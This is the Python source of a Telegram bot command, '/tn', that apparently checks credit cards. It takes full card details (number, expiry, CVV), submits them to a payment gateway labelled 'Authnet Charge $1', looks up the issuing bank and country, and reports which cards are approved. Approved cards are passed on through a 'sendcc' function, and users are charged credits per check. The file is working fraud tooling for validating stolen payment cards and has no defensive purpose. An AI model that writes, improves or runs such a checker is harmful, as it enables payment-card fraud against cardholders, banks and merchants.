import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import *
from .gate import *

@Client.on_message(filters.command("tn", [".", "/"]))
async def b3_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)

        gateway = "Authnet Charge $1"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc == False:
            resp = f"""<b>
Gate Name: {gateway} ♻️
CMD: /tn

Message: No CC Found in your input ❌

Usage: /tn cc|month|year|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        firstresp = f"""
↯ Checking.

- [そ] 𝗖𝗮𝗿𝗱 - <code>{fullcc}</code> 
- [ヸ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- [仝] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
</b>
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""
↯ Checking..

- [そ] 𝗖𝗮𝗿𝗱 - <code>{fullcc}</code> 
- [ヸ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- [仝] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()
        session = httpx.AsyncClient(timeout=30, follow_redirects=True)
        result = await create_braintree_auth(fullcc, session)
        getbin = await get_bin_details(cc)
        getresp = await get_charge_resp(result, user_id, fullcc)
        status = getresp["status"]
        response = getresp["response"]

        thirdresp = f"""
↯ Checking...

- [そ] 𝗖𝗮𝗿𝗱 - <code>{fullcc}</code> 
- [ヸ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- [仝] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        brand = getbin[0]
        type = getbin[1]
        level = getbin[2]
        bank = getbin[3]
        country = getbin[4]
        flag = getbin[5]
        currency = getbin[6]

        finalresp = f"""
{status}

[そ] 𝗖𝗮𝗿𝗱- <code>{fullcc}</code> 
[ヸ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲- <i>{gateway}</i>
[仝] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ⤿ <i>{response}</i> ⤾

[そ] 𝗜𝗻𝗳𝗼- {brand} - {type} - {level}
[ヸ] 𝐁𝐚𝐧𝐤- {bank} 
[仝] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲- {country} - {flag} - {currency}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
╚━━━━━━「 𝑰𝑵𝑭𝑶 」━━━━━━╝
╚━━━━━━「 𝑰𝑵𝑭𝑶 」━━━━━━╝
⚜️ 𝑻𝒊𝒎𝒆 𝑺𝒑𝒆𝒏𝒕 -» {time.perf_counter() - start:0.2f} seconds
⚜️ 𝑪𝒉𝒆c𝒌𝒆𝒅 𝒃𝒚: <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
⚜️ 𝑶𝒘𝒏𝒆𝒓: <a href="tg://user?id=7941175119">ᶻⒺ𝓡𝐎</a>
╚━━━━━━「𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑」━━━━━━╝
"""
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)

        await setantispamtime(user_id)
        await deductcredit(user_id)
        if status == "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" or status == "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅":
            await sendcc(finalresp, session)
        await session.aclose()

    except Exception as e:
        import traceback
        await error_log(traceback.format_exc())